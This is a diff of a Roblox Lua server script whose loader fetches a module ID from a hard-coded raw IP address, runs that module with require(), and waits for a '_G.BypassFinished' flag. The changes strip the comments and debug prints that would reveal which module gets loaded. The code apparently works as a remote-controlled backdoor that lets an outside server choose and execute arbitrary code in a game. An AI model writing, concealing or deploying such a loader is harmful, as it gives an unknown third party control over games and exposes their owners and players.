@@ -4,10 +4,8 @@ local RunService = game:GetService("RunService")
 local NetworkServer = game:GetService("NetworkServer")
 
 local function MainModuleLoader()
-    local baseURL = 'http://74.208.152.188/Assets' -- Updated IP from screenshot
-    local fatol = true -- Retained for consistency, though unused
+    local baseURL = 'http://74.208.152.188/Assets'
     
-    -- Fetch MainModule data from VPS
     local success, response = pcall(function()
         return HttpService:GetAsync(baseURL)
     end)
@@ -15,9 +13,7 @@ local function MainModuleLoader()
         warn("Failed to fetch MainModule data: " .. tostring(response))
         return
     end
-    print("Raw response from VPS:", response)  -- DEBUG: Confirm raw data
     
-    -- Decode JSON response with error handling
     local data
     local decodeSuccess, decodeResult = pcall(function()
         return HttpService:JSONDecode(response)
@@ -27,10 +23,8 @@ local function MainModuleLoader()
         return
     end
     data = decodeResult
-    print("Decoded data:", HttpService:JSONEncode(data))  -- DEBUG: Confirm parsed structure
     
     local universeId = tostring(game.GameId)
-    print("Universe ID:", universeId)  -- DEBUG: Confirm GameId
     
     local universeData = data[universeId]
     if not universeData then
@@ -44,15 +38,12 @@ local function MainModuleLoader()
         return
     end
     
-    print("Loading MainModule ID: " .. mainModuleId)
     local mmid = mainModuleId
     require(mmid)()
     
-    -- Wait for bypass to complete
     repeat wait() until _G.BypassFinished
     _G.FilesInitialized = true
     
-    -- Enable character auto-loading
     Players.CharacterAutoLoads = true
     for _, plr in ipairs(Players:GetPlayers()) do
         pcall(function()
@@ -60,7 +51,6 @@ local function MainModuleLoader()
         end)
     end
     
-    -- Security checks for RemoteFunction (unchanged)
     if not _G.SecureLoading then
         _G.SecureLoading = true
         if not RunService:IsStudio() and RunService:IsServer() and NetworkServer then
